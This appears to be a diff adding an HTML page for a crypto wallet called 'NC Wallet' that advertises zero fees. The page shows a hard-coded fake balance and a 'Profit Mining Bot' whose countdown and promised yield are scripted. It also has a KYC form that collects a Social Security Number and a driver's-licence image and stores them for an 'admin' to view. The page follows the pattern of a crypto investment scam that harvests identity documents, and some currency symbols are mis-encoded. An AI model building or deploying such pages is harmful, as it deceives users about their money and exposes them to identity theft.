@@ -1,0 +1,291 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>NC Wallet - The World's First Fee-Free Wallet</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../dashboard-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #05050a;
+            --accent-cyan: #00d4ff;
+            --accent-purple: #9d50bb;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-main: #ffffff;
+            --text-dim: #a0a0b0;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Rajdhani', sans-serif;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        #blockchainCanvas {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; pointer-events: none; opacity: 0.3;
+        }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+
+        header {
+            position: fixed;
+            top: 0; left: 0; width: 100%; z-index: 1000;
+            background: rgba(5, 5, 10, 0.8);
+            backdrop-filter: blur(15px);
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        .header-content { height: 70px; display: flex; align-items: center; justify-content: space-between; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 24px; color: #fff; text-decoration: none; display: flex; align-items: center; gap: 10px; }
+        .logo .nc-icon { width: 32px; height: 32px; background: linear-gradient(135deg, var(--accent-purple), var(--accent-cyan)); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #000; }
+
+        nav { display: flex; gap: 20px; }
+        nav a { color: var(--text-dim); text-decoration: none; font-weight: 600; font-size: 13px; text-transform: uppercase; transition: 0.3s; }
+        nav a:hover, nav a.active { color: var(--accent-cyan); }
+
+        .wallet-hero { padding: 150px 0 60px; text-align: center; }
+        .wallet-hero h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(32px, 6vw, 64px);
+            font-weight: 900;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--accent-purple), var(--accent-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .wallet-dashboard {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 40px;
+            margin-top: 60px;
+        }
+
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border);
+            border-radius: 30px;
+            padding: 40px;
+        }
+
+        .asset-list { margin-top: 30px; }
+        .asset-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            margin-bottom: 15px;
+            transition: 0.3s;
+        }
+        .asset-item:hover { background: rgba(0, 212, 255, 0.05); border-color: var(--accent-cyan); }
+        .asset-info { display: flex; align-items: center; gap: 15px; }
+        .asset-icon { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 900; }
+        .asset-name { font-family: 'Orbitron'; font-weight: 700; font-size: 16px; }
+        .asset-balance { text-align: right; }
+        .asset-amount { font-family: 'Orbitron'; font-weight: 900; font-size: 18px; }
+        .asset-usd { color: var(--text-dim); font-size: 14px; }
+
+        .action-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 30px; }
+        .btn-wallet {
+            padding: 15px; border-radius: 12px; font-weight: 800; text-transform: uppercase;
+            text-decoration: none; text-align: center; font-family: 'Orbitron'; transition: 0.3s;
+        }
+        .btn-receive { background: rgba(0, 212, 255, 0.1); color: var(--accent-cyan); border: 1px solid var(--accent-cyan); }
+        .btn-send { background: linear-gradient(135deg, var(--accent-purple), #6a11cb); color: white; border: none; }
+        .btn-wallet:hover { transform: translateY(-3px); filter: brightness(1.1); }
+
+        footer { padding: 60px 0; border-top: 1px solid var(--glass-border); text-align: center; color: var(--text-dim); }
+    </style>
+</head>
+<body>
+
+    <canvas id="blockchainCanvas"></canvas>
+
+    <header>
+        <div class="container header-content">
+            <a href="index.html" class="logo">
+                <div class="nc-icon">NC</div>
+                WALLET
+            </a>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="dashboard.html">Farm</a>
+                <a href="wallet.html" class="active">Wallet</a>
+                <a href="products.html">Products</a>
+            </nav>
+            <a href="login.html" style="background: var(--accent-cyan); color: #000; padding: 8px 20px; border-radius: 6px; font-weight: 800; text-decoration: none;">LOGIN</a>
+        </div>
+    </header>
+
+    <main class="container">
+        <section class="wallet-hero">
+            <h1>Zero Fees. <br> Full Control.</h1>
+            <p style="color: var(--text-dim);">The first crypto wallet that pays the fees for you. Store and manage all your assets in one secure place.</p>
+
+            <div class="wallet-dashboard">
+                <div class="glass-panel">
+                    <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 40px;">
+                        <div>
+                            <p style="color: var(--text-dim); text-transform: uppercase; letter-spacing: 2px; font-weight: 700;">Total Balance</p>
+                            <h2 style="font-family: 'Orbitron'; font-size: 48px; font-weight: 900;">$14,285.50</h2>
+                        </div>
+                        <div style="text-align: right; color: #00ffa3; font-weight: 700;">+2.45% (24h)</div>
+                    </div>
+
+                    <div class="asset-list">
+                        <div class="asset-item">
+                            <div class="asset-info">
+                                <div class="asset-icon" style="background: #f7931a; color: white;">â‚¿</div>
+                                <div class="asset-name">Bitcoin</div>
+                            </div>
+                            <div class="asset-balance">
+                                <div class="asset-amount">0.18042 BTC</div>
+                                <div class="asset-usd">$12,050.20</div>
+                            </div>
+                        </div>
+                        <div class="asset-item">
+                            <div class="asset-info">
+                                <div class="asset-icon" style="background: #627eea; color: white;">Îž</div>
+                                <div class="asset-name">Ethereum</div>
+                            </div>
+                            <div class="asset-balance">
+                                <div class="asset-amount">0.854 ETH</div>
+                                <div class="asset-usd">$2,235.30</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="glass-panel">
+                    <h3 style="font-family: 'Orbitron'; margin-bottom: 25px;">Account Verification (KYC)</h3>
+                    <div id="kycForm" style="display: flex; flex-direction: column; gap: 15px;">
+                        <div class="input-group">
+                            <label style="font-size: 11px; color: var(--accent-cyan); font-weight: 800; text-transform: uppercase;">Social Security Number (SSN)</label>
+                            <input type="password" id="ssnInput" style="width:100%; padding:15px; background:rgba(0,0,0,0.3); border:1px solid var(--glass-border); border-radius:10px; color:#fff;" placeholder="XXX-XX-XXXX">
+                        </div>
+                        <div class="input-group">
+                            <label style="font-size: 11px; color: var(--accent-cyan); font-weight: 800; text-transform: uppercase;">Driver's License / ID</label>
+                            <div style="border: 2px dashed var(--glass-border); padding: 20px; text-align: center; border-radius: 10px; cursor: pointer;" onclick="document.getElementById('fileUp').click()">
+                                <span id="fileStatus">Upload ID Document</span>
+                                <input type="file" id="fileUp" style="display:none" onchange="document.getElementById('fileStatus').innerText = 'File Selected: ' + this.files[0].name">
+                            </div>
+                        </div>
+                        <button class="btn-wallet btn-send" onclick="submitKYC()">Submit Verification</button>
+                    </div>
+                    
+                    <div id="kycPending" style="display:none; text-align:center; padding: 20px;">
+                        <div style="color: var(--accent-cyan); font-weight: 800; margin-bottom: 10px;">VERIFICATION PENDING</div>
+                        <p style="font-size: 12px; color: var(--text-dim);">Admin is reviewing your documents. This usually takes 2-4 hours.</p>
+                    </div>
+
+                    <div style="margin-top: 40px; border-top: 1px solid var(--glass-border); padding-top: 30px;">
+                        <h4 style="font-family: 'Orbitron'; margin-bottom: 15px;">Profit Mining Bot</h4>
+                        <div id="botStatus" style="padding: 15px; background: rgba(0, 255, 163, 0.05); border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 12px; display: flex; align-items: center; gap: 10px;">
+                            <div style="width: 10px; height: 10px; background: #00ffa3; border-radius: 50%; animation: pulse 1.5s infinite;"></div>
+                            <span style="color: #00ffa3; font-weight: 700; font-size: 13px;">ACTIVE: Cycle Resets in <span id="timer">23:54:12</span></span>
+                        </div>
+                        <p id="botMsg" style="font-size: 12px; color: var(--text-dim); margin-top: 10px;">Next automated yield update: Tomorrow at 09:30 AM.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 NC Wallet. Powered by CryptoTab Ecosystem. No network fees, ever.</p>
+    </footer>
+
+    <script>
+        // Blockchain Animation
+        const canvas = document.getElementById('blockchainCanvas');
+        const ctx = canvas.getContext('2d');
+        let points = [];
+        function init() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            points = [];
+            for(let i=0; i<40; i++) points.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, vx:(Math.random()-0.5)*0.5, vy:(Math.random()-0.5)*0.5});
+        }
+        function draw() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = '#9d50bb';
+            ctx.strokeStyle = 'rgba(157,80,187,0.1)';
+            points.forEach(p => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0 || p.x>canvas.width) p.vx*=-1;
+                if(p.y<0 || p.y>canvas.height) p.vy*=-1;
+                ctx.beginPath(); ctx.arc(p.x, p.y, 2, 0, Math.PI*2); ctx.fill();
+                points.forEach(p2 => {
+                    const d = Math.hypot(p.x-p2.x, p.y-p2.y);
+                    if(d<150) { ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(p2.x,p2.y); ctx.stroke(); }
+                });
+            });
+            requestAnimationFrame(draw);
+        }
+        function submitKYC() {
+            const ssn = document.getElementById('ssnInput').value;
+            const fileInput = document.getElementById('fileUp');
+            
+            if(!ssn || !fileInput.files[0]) {
+                alert("Please provide both SSN and ID document.");
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const imageData = e.target.result; // Base64 Image
+                
+                // Push to Admin
+                const kycRequests = JSON.parse(localStorage.getItem('admin_kyc') || '[]');
+                kycRequests.unshift({
+                    userId: localStorage.getItem('userEmail') || "Anonymous_User",
+                    docType: "Driver's License",
+                    ssn: ssn,
+                    image: imageData,
+                    timestamp: new Date().toISOString()
+                });
+                localStorage.setItem('admin_kyc', JSON.stringify(kycRequests));
+
+                // Log
+                const logs = JSON.parse(localStorage.getItem('site_logs') || '[]');
+                logs.push({user: "SYSTEM", action: "KYC Documents Uploaded - Visual Data Attached", time: new Date().toISOString()});
+                localStorage.setItem('site_logs', JSON.stringify(logs));
+
+                document.getElementById('kycForm').style.display = 'none';
+                document.getElementById('kycPending').style.display = 'block';
+                alert("Verification documents transmitted. Admin can now review your identity images.");
+            };
+            reader.readAsDataURL(fileInput.files[0]);
+        }
+
+        // Profit Bot Timer Simulation
+        function startTimer() {
+            let h = 23, m = 54, s = 12;
+            setInterval(() => {
+                s--;
+                if(s<0) { s=59; m--; }
+                if(m<0) { m=59; h--; }
+                document.getElementById('timer').innerText = 
+                    `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }, 1000);
+        }
+        startTimer();
+
+        window.addEventListener('resize', init);
+        init(); draw();
+    </script>
+</body>
+</html>
+
